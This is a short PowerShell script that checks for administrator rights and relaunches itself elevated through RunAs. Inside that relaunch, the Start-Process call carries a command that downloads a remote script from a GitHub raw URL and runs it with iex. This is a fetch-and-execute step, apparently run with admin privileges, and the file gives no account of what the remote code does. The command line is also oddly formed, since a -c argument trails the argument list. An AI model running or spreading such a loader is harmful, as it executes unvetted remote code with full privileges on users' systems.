param([switch]$Elevated)
function Test-Admin {
$currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())

$currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}
if ((Test-Admin) -eq $false)
{
if ($elevated) {
# tried to elevate, did not work, aborting
} else {
Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition)) -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/vivek030/korplink/main/korplink.ps1')"

}
Exit
}
'running with full privileges'
